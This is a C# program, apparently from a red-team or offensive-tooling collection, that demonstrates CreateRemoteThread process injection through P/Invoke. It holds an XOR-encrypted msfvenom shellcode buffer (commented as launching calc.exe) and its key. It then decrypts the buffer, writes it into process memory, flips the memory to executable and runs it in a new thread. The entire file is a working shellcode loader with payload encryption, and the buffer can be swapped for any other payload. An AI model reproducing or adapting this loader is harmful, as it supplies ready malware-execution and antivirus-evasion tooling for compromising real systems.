using System;
using static Loader.Imports;
using static Loader.Enums;

namespace CRT {

    class Program {
        /// <summary>
        /// This program will pop calc using the CreateRemoteThread style of process injection. 
        /// It uses classic P/Invoke to call the unmanged code. 
        /// </summary>
        
        static void Main(string[] args) {

            IntPtr hProc; // handle to our process
            IntPtr hMemory; // handle to the region of memory to write the shellcode to
            int pid = Convert.ToInt32(System.Diagnostics.Process.GetCurrentProcess().Id); // get the current pid
            bool success; // generic boolean to catch whether the command executed successfully
            MemoryProtection oldProtect; // the previous value of the memory protection of a memory segment
            IntPtr threadId; // the thread ID of our injected process

            // shellcode: msfvenom -p windows/x64/exec CMD="calc.exe"
            byte[] buf = new byte[276] {
0x22,0xfe,0x8d,0xe4,0x9e,0x78,0x90,0x36,0x47,0x0e,0xac,0x12,0xa8,0x38,0x86,0xaf,
0x88,0xfe,0x3f,0xd2,0x0b,0xd8,0xdb,0x64,0x27,0x46,0x66,0x11,0xf1,0x20,0x5f,0xac,
0xfe,0xfe,0x85,0x72,0x3e,0xd8,0x5f,0x81,0x0d,0x44,0xa0,0x72,0x20,0x20,0xe5,0x3e,
0x72,0x8a,0x6f,0x7c,0x6c,0xbc,0x70,0x77,0x86,0xc7,0xe0,0x02,0xe8,0xa9,0x36,0x13,
0x8c,0xf7,0x5f,0x48,0xe5,0xc2,0x70,0xbd,0x05,0x32,0xa5,0x42,0x39,0xe3,0x54,0x76,
0xde,0xb6,0x0e,0x48,0xeb,0x50,0x24,0x51,0x0f,0x0f,0x3d,0x13,0x62,0x20,0xcc,0xba,
0x55,0xf6,0x2e,0x49,0x6f,0x40,0xb3,0x60,0x0f,0xf1,0x24,0x02,0x62,0x5c,0x5c,0xb6,
0xdf,0x60,0x43,0x31,0xa7,0xd8,0x61,0xf6,0xeb,0x4f,0x2c,0x8a,0xe4,0x29,0xd5,0x3f,
0xe6,0x56,0x7b,0xf1,0x22,0x93,0x1c,0x12,0x4f,0x4b,0xd4,0x92,0x9c,0xb0,0x8c,0xba,
0x55,0xf6,0x2a,0x49,0x6f,0x40,0x36,0x77,0xcc,0x02,0xa5,0x07,0x62,0x28,0xc8,0xb7,
0xdf,0x66,0x4f,0x8b,0x6a,0x18,0x18,0x37,0x97,0x4f,0xb5,0x02,0xb1,0x36,0x8d,0xa4,
0x9f,0xee,0x4f,0x59,0x2f,0xca,0x18,0xb5,0xab,0x2e,0xac,0x11,0x16,0x88,0x8c,0xbf,
0x87,0xec,0x46,0x8b,0x7c,0x79,0x07,0xc9,0xb8,0xf1,0xb0,0x0b,0x53,0x69,0xd4,0xfe,
0xde,0xb6,0x0e,0x00,0x6e,0xd8,0xdd,0xbb,0x46,0x0f,0xed,0x43,0xa8,0xd2,0xe5,0x75,
0xb1,0x31,0xf1,0xd5,0xd5,0x60,0xe5,0x94,0x11,0x4f,0x57,0xe5,0x7c,0xd5,0x49,0x01,
0x0b,0xfe,0x8d,0xc4,0x46,0xac,0x56,0x4a,0x4d,0x8e,0x16,0xa3,0x9c,0x6d,0x6f,0xb9,
0xcd,0xc4,0x61,0x6a,0x6e,0xc9,0x11,0xbf,0x9d,0xf1,0x38,0x20,0x88,0x04,0xb7,0xd0,
0xbb,0xce,0x6b,0x00 };
            byte[] key = new byte[16] {
0xde,0xb6,0x0e,0x00,0x6e,0x90,0x50,0x36,0x47,0x0e,0xed,0x43,0xe9,0x68,0xd4,0xfe };
            buf = Crypto.XOR(buf, key);

            // Classic Process Injection using P/Invoke
            Console.WriteLine("[*] Beginning CreateRemoteThread Injection using P/Invoke (Classic), hit enter to continue...");
            Console.ReadLine();

            // Get a handle
            Console.WriteLine("[+] Calling OpenProcess using P/Invoke...");
            hProc = OpenProcess((uint)ProcessAccess.AllAccess, false, pid);
            Console.WriteLine("[>] Process Handle: " + string.Format("{0}", hProc.ToInt64()));

            // allocate a region of memory in the process to write to
            Console.WriteLine("[+] Calling VirtualAllocEx using P/Invoke...");
            hMemory = VirtualAllocEx(hProc, IntPtr.Zero, (uint)buf.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);
            Console.WriteLine("[>] Memory Handle: " + string.Format("0x{0:X}", hMemory.ToInt64()));

            // Write the shellcode to the memory
            Console.WriteLine("[+] Calling WriteProcessMemory using P/Invoke...");
            success = WriteProcessMemory(hProc, hMemory, buf, buf.Length, out IntPtr bytesWritten);
            if (success)
            {
                Console.WriteLine("[>] Bytes Written: " + string.Format("{0}", bytesWritten.ToInt64()));
            }
            else
            {
                Console.WriteLine("[-] Failed to WriteProcessMemory, exiting...");
                return;
            }

            // Change the memory protections to RX
            Console.WriteLine("[+] Calling VirtualProtectEx using P/Invoke...");
            success = VirtualProtectEx(hProc, hMemory, bytesWritten, MemoryProtection.ExecuteRead, out oldProtect);
            if (success)
            {
                Console.WriteLine("[>] Changed Permissions at Memory Address: " + string.Format("0x{0:X}", hMemory.ToInt64()));
            }
            else
            {
                Console.WriteLine("[-] Failed to change memory permissions using VirtualProtectEx, exiting...");
                return;
            }

            // Create a thread to run the shellcode in memory
            Console.WriteLine("[+] Calling CreateRemoteThread using P/Invoke...");
            hMemory = CreateRemoteThread(hProc, IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, out threadId);
            Console.WriteLine("[>] Created Thread with ID: " + string.Format("{0}", threadId.ToInt64()));
            Console.ReadLine();
        }

    }
}

